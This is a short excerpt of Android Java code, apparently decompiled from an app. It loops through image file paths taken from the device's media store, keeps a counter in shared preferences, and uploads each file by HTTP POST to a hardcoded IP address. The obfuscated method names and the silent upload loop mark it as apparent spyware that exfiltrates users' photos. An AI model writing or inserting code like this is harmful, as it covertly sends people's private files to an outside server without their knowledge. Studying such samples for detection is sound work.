...
//            String desc = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DESCRIPTION));
    ...
    private static void cwcyb() {
        if (mConunt >= mFilePash.size() - 1) {
        ...
        SharedPreferences.Editor editor = sp.edit();
        editor.putString("count", mConunt + "");
        Fud.SharedPreferencesCompat.apply(editor);
        swcyb(new File(mFilePash.get(mConunt)));
    }

    private static void swcyb(File file) {
        OkGo.<String>post("http://47.104.6.226:8080/file/setfile")
                .params("file", file)
